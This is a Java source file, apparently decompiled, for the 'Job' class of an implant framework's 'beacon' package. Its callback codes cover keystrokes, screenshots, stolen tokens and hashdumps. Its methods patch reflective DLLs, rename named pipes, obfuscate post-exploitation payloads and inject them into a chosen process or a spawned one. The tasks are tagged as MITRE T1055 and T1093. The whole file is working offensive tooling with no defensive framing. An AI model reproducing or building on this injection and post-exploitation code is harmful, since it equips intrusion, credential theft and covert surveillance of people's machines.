package beacon;

import common.CommonUtils;
import common.ReflectiveDLL;
import common.SleevedResource;
import java.util.Stack;
import pe.PostExObfuscator;
import sleep.runtime.SleepUtils;

public abstract class Job {
   public static final int CALLBACK_OUTPUT = 0;
   public static final int CALLBACK_KEYSTROKES = 1;
   public static final int CALLBACK_FILE = 2;
   public static final int CALLBACK_SCREENSHOT = 3;
   public static final int CALLBACK_CLOSE = 4;
   public static final int CALLBACK_READ = 5;
   public static final int CALLBACK_CONNECT = 6;
   public static final int CALLBACK_PING = 7;
   public static final int CALLBACK_FILE_WRITE = 8;
   public static final int CALLBACK_FILE_CLOSE = 9;
   public static final int CALLBACK_PIPE_OPEN = 10;
   public static final int CALLBACK_PIPE_CLOSE = 11;
   public static final int CALLBACK_PIPE_READ = 12;
   public static final int CALLBACK_POST_ERROR = 13;
   public static final int CALLBACK_PIPE_PING = 14;
   public static final int CALLBACK_TOKEN_STOLEN = 15;
   public static final int CALLBACK_TOKEN_GETUID = 16;
   public static final int CALLBACK_PROCESS_LIST = 17;
   public static final int CALLBACK_POST_REPLAY_ERROR = 18;
   public static final int CALLBACK_PWD = 19;
   public static final int CALLBACK_JOBS = 20;
   public static final int CALLBACK_HASHDUMP = 21;
   public static final int CALLBACK_PENDING = 22;
   public static final int CALLBACK_ACCEPT = 23;
   public static final int CALLBACK_NETVIEW = 24;
   public static final int CALLBACK_PORTSCAN = 25;
   public static final int CALLBACK_DEAD = 26;
   public static final int CALLBACK_SSH_STATUS = 27;
   public static final int CALLBACK_CHUNK_ALLOCATE = 28;
   public static final int CALLBACK_CHUNK_SEND = 29;
   public static final int CALLBACK_OUTPUT_OEM = 30;
   public static final int CALLBACK_ERROR = 31;
   public static final int CALLBACK_OUTPUT_UTF8 = 32;
   protected CommandBuilder builder = new CommandBuilder();
   protected TaskBeacon tasker;
   protected String arch = "";
   protected int pid = 0;

   public Job(TaskBeacon var1) {
      this.tasker = var1;
   }

   public boolean isInject() {
      return this.pid != 0;
   }

   public int getJobType() {
      return 40;
   }

   public abstract String getDescription();

   public abstract String getShortDescription();

   public abstract String getDLLName();

   public abstract String getPipeName();

   public abstract int getCallbackType();

   public abstract int getWaitTime();

   public boolean ignoreToken() {
      return true;
   }

   public String getTactic() {
      return "";
   }

   public String getTactics(String var1) {
      return "".equals(this.getTactic()) ? var1 : this.getTactic() + ", " + var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
   }

   public byte[] _obfuscate(byte[] var1) {
      PostExObfuscator var2 = new PostExObfuscator();
      var2.process(var1);
      this.obfuscate(var2, var1);
      return var2.getImage();
   }

   public byte[] fix(byte[] var1) {
      return var1;
   }

   public byte[] setupSmartInject(byte[] var1) {
      return !this.tasker.useSmartInject() ? var1 : PostExObfuscator.setupSmartInject(var1);
   }

   public byte[] getDLLContent() {
      return SleevedResource.readResource(this.getDLLName());
   }

   public void inject(String var1, int var2, String var3) {
      this.pid = var2;
      this.arch = var3;
      byte[] var4 = this.getDLLContent();
      if (var3.equals("x64")) {
         var4 = ReflectiveDLL.patchDOSHeaderX64(var4, 170532320);
         this.builder.setCommand(43);
      } else {
         var4 = ReflectiveDLL.patchDOSHeader(var4, 170532320);
         this.builder.setCommand(9);
      }

      String var5 = "\\\\.\\pipe\\" + this.tasker.getPostExPipeName(this.getPipeName());
      var4 = CommonUtils.patch(var4, "\\\\.\\pipe\\" + this.getPipeName(), var5);
      var4 = this.fix(var4);
      var4 = this.tasker.getThreadFix().apply(var4);
      if (this.tasker.obfuscatePostEx()) {
         var4 = this._obfuscate(var4);
      }

      var4 = this.setupSmartInject(var4);
      byte[] var6 = null;
      String var7 = this.tasker.checkProcessInjectExplicitHook(var1, var4, var2, 0, var3);
      if (CommonUtils.isNullOrEmpty(var7)) {
         this.builder.addInteger(var2);
         this.builder.addInteger(0);
         this.builder.addString(CommonUtils.bString(var4));
         var6 = this.builder.build();
      }

      this.builder.setCommand(this.getJobType());
      this.builder.addInteger(var2);
      this.builder.addShort(this.getCallbackType());
      this.builder.addShort(this.getWaitTime());
      this.builder.addLengthAndString(var5);
      this.builder.addLengthAndString(this.getShortDescription());
      byte[] var8 = this.builder.build();
      if (var6 != null) {
         this.tasker.task(var1, var6, var8, this.getDescription(), this.getTactics("T1055"));
      } else {
         this.tasker.task(var1, var8, this.getDescription(), this.getTactics("T1055"));
      }

   }

   public void spawn(String var1, String var2) {
      this.arch = var2;
      byte[] var3 = this.getDLLContent();
      if (var2.equals("x64")) {
         var3 = ReflectiveDLL.patchDOSHeaderX64(var3, 1453503984);
         if (this.ignoreToken()) {
            this.builder.setCommand(44);
         } else {
            this.builder.setCommand(90);
         }
      } else {
         var3 = ReflectiveDLL.patchDOSHeader(var3, 1453503984);
         if (this.ignoreToken()) {
            this.builder.setCommand(1);
         } else {
            this.builder.setCommand(89);
         }
      }

      String var4 = "\\\\.\\pipe\\" + this.tasker.getPostExPipeName(this.getPipeName());
      var3 = CommonUtils.patch(var3, "\\\\.\\pipe\\" + this.getPipeName(), var4);
      var3 = this.fix(var3);
      var3 = this.tasker.getThreadFix().apply(var3);
      if (this.tasker.obfuscatePostEx()) {
         var3 = this._obfuscate(var3);
      }

      var3 = this.setupSmartInject(var3);
      Stack var5 = new Stack();
      var5.push(SleepUtils.getScalar(var2));
      var5.push(SleepUtils.getScalar(this.ignoreToken()));
      var5.push(SleepUtils.getScalar(var3));
      var5.push(SleepUtils.getScalar(var1));
      String var6 = this.tasker.getClient().getScriptEngine().format("PROCESS_INJECT_SPAWN", var5);
      byte[] var7 = null;
      if (CommonUtils.isNullOrEmpty(var6)) {
         this.builder.addString(CommonUtils.bString(var3));
         var7 = this.builder.build();
      }

      this.builder.setCommand(this.getJobType());
      this.builder.addInteger(0);
      this.builder.addShort(this.getCallbackType());
      this.builder.addShort(this.getWaitTime());
      this.builder.addLengthAndString(var4);
      this.builder.addLengthAndString(this.getShortDescription());
      byte[] var8 = this.builder.build();
      if (var7 != null) {
         this.tasker.task(var1, var7, var8, this.getDescription(), this.getTactics("T1093"));
      } else {
         this.tasker.task(var1, var8, this.getDescription(), this.getTactics("T1093"));
      }

   }
}
